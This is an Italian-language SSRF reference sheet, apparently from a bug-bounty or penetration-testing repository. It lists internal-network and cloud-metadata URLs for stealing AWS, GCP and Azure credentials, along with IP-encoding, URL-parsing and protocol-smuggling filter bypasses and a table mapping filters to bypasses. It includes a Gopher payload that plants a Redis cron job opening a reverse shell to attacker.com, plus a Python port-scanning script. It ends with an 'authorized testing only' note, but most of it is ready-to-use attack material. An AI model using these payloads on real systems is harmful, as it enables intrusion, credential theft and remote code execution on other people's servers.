# 🌐 SSRF - Server-Side Request Forgery — scheda di riferimento

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Richieste lato server verso destinazioni non previste (Server-Side Request Forgery)
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

> **Nota sugli esempi:** protocolli, formati IP e reindirizzamenti dipendono dal client e dai controlli applicati; non sono aggiramenti universali. Selezionare una porta in un URL HTTP non fa parlare al client il protocollo di quel servizio. Le risposte e gli errori non provano da soli che una porta sia aperta, né l’impatto è automaticamente critico. I frammenti Gopher/Redis e HTTP sono illustrativi e incompleti; il titolo “HTTP Request Smuggling” non dimostra da solo una desincronizzazione HTTP. L’accesso ai metadati cloud dipende da versione, header e configurazione. Vedi la [guida PortSwigger](https://portswigger.net/web-security/ssrf).

---

## 🎯 Che cos'è SSRF

Una vulnerabilità **SSRF** consente a un attaccante di indurre il server a inviare richieste verso destinazioni non previste, con possibile accesso a servizi interni o metadati cloud.

### Impatto
- 🔴 **Accesso alla rete interna** - Scansione dei servizi interni
- 🔴 **Metadati cloud** - Furto di credenziali AWS/GCP
- 🔴 **Aggiramento dei firewall** - Accesso a risorse protette
- 🔴 **RCE** - In alcuni casi, esecuzione di codice remoto

---

## 🔍 Dove cercare

### Parametri comuni
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

### Funzionalità comunemente vulnerabili
```
- Funzioni di recupero o validazione degli URL
- Generatori di PDF
- Elaboratori di immagini
- Importazione di file
- Webhook
- Integrazioni API
- Strumenti di raccolta di dati dal web (web scraper)
- Servizi di acquisizione di screenshot
```

---

## 💉 Payload di base

### Localhost
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

### Reti interne
```
# Classe A (terminologia storica)
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# Classe B (terminologia storica)
http://172.16.0.1
http://172.31.255.255

# Classe C (terminologia storica)
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# Indirizzo link-local
http://169.254.169.254
```

### Porte comuni
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # Alt HTTP
http://127.0.0.1:9200  # Elasticsearch
```

---

## ☁ Metadati cloud

### AWS
```
# Metadati dell'istanza (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Dati specifici
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Con l'header richiesto
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Richiede un header
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

## 🛡 Tecniche di aggiramento

### Formati degli indirizzi IP
```
# Decimale
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Esadecimale
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Ottale
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# Misto
http://127.1
http://127.0.1
http://0
```

### Codifica URL
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# Doppia codifica
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

### DNS Rebinding
```
# Usa servizi come:
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# Configura un DNS personalizzato
your-domain.com → 127.0.0.1
```

### Problemi nell'analisi degli URL
```
# Espediente con @
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# Frammenti
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# Barra inversa
http://attacker.com\127.0.0.1
```

### Uso improprio di protocolli alternativi (protocol smuggling)
```
# File
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

### Catena con open redirect
```
# Se il sito presenta un open redirect:
https://target.com/redirect?url=http://169.254.169.254/

# Reindirizzamento verso l'interno
http://target.com/redirect?url=http://127.0.0.1:8080
```

### Aggiramento tramite IPv6
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

### Injection negli header
```
# Injection CRLF nell'URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

## 🔥 Sfruttamento

### Esecuzione di codice remoto in Redis tramite Gopher
```
# Genera il payload
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### Desincronizzazione delle richieste HTTP (HTTP Request Smuggling)
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

### Scansione delle porte
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

## 📊 Riferimento rapido

### Rilevamento
```
# Verifica la presenza di SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# Controlla la risposta
- È stata ricevuta una query DNS?
- È stata ricevuta una richiesta HTTP?
- La risposta cambia per gli IP interni?
```

### Livelli di impatto

| Bersaglio | Impatto |
| -------- | -------- |
| Metadati cloud | Critico: furto di credenziali |
| API interne | Alto: accesso ai dati |
| Servizi interni | Alto: possibile esecuzione di codice remoto |
| Scansione delle porte | Medio: divulgazione di informazioni |

### Filtri comuni e aggiramenti

| Filtro | Aggiramento |
| -------- | -------- |
| Blocco di `localhost` | Uso di `127.0.0.1`, `0`, `[::1]` |
| Blocco di `127.0.0.1` | Uso del formato decimale `2130706433` |
| Blocco degli IP privati | Uso del DNS rebinding |
| Solo HTTP | Prova `gopher://`, `file://` |
| Dominio nell'elenco consentito | Uso dell'espediente con `@` e degli open redirect |

---

## 🛠 Strumenti

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus (generatore di payload Gopher)
python gopherus.py --exploit redis

# Collaborator o webhook per SSRF blind
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

## 📚 Risorse

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [SSRF Bible](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 Verifica lo sfruttamento di SSRF!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
